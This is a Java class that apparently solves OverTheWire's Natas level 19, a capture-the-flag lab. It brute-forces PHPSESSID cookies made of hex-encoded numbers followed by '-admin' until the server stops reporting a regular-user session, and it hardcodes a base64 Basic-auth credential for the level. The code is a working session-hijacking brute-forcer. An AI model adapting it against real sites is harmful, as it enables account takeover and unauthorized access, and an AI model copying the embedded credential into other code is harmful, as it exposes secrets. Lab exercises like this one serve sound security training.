package sessionHijacking;

import responseReader.HttpURLConnectionResponseReader;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.function.Consumer;
import java.util.function.Function;
import java.util.zip.GZIPInputStream;

public class NatasHexCookieValueGuesser extends IntegerCookieValueGuesser {

    public NatasHexCookieValueGuesser(int guessFrom, int guessTo) {
        super(guessFrom, guessTo);
    }

    @Override
    protected boolean isGuessSuccessful(String response) {
        String unsuccessfulMessage
                = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.";
        return !response.contains(unsuccessfulMessage);
    }

    @Override
    protected String getCookieTemplate() {
        return "PHPSESSID=%s";
    }

    @Override
    protected HttpURLConnection getHttpURLConnection(String cookie) throws Exception {
        URL url = new URL("http://natas19.natas.labs.overthewire.org/index.php");
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        urlConnection.setRequestMethod("POST");
        urlConnection.setRequestProperty("Cache-Control", "max-age=0");
        urlConnection.setRequestProperty("Authorization", "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==");
        urlConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
        urlConnection.setRequestProperty("Origin", "http://natas19.natas.labs.overthewire.org");
        urlConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36");
        urlConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        urlConnection.setRequestProperty("Referer", "http://natas19.natas.labs.overthewire.org/");
        urlConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        urlConnection.setRequestProperty("Cookie", cookie);
        return urlConnection;
    }

    @Override
    protected HttpURLConnectionResponseReader getResponseReader() {
        return from -> {
            StringBuilder stringBuilder = new StringBuilder(1024);
            try (GZIPInputStream gzipInputStream = new GZIPInputStream(from.getInputStream());
                 InputStreamReader inputStreamReader = new InputStreamReader(gzipInputStream);
                 BufferedReader bufferedReader = new BufferedReader(inputStreamReader)) {
                bufferedReader.skip(807);
                while (true) {
                    int ch = bufferedReader.read();
                    if (ch == -1) {
                        break;
                    }
                    char next = (char) ch;

                    stringBuilder.append(next);
                }
            }
            String out = stringBuilder.toString();
            int indexAfterPre = out.indexOf("<pre>") + 5;
            int lastIndexOfPre = out.lastIndexOf("</pre>");
            if (indexAfterPre == 4 || lastIndexOfPre == -1) {
                return out;
            }
            return out.substring(indexAfterPre, lastIndexOfPre);
        };
    }

    @Override
    protected Function<Integer, String> getIntegerTransformer() {
        String end = convertToHexByChars("-admin");
        return integer -> {
            String start = convertToHexByChars(integer.toString());
            return String.format("%s%s", start, end);
        };
    }

    private String convertToHexByChars(String s){
        StringBuilder sb = new StringBuilder(s.length());
        for (char c : s.toCharArray()) {
            sb.append(Integer.toString(c, 16));
        }
        return sb.toString();
    }

    @Override
    protected Consumer<String> getHijackingAction() {
        return System.out::println;
    }
}
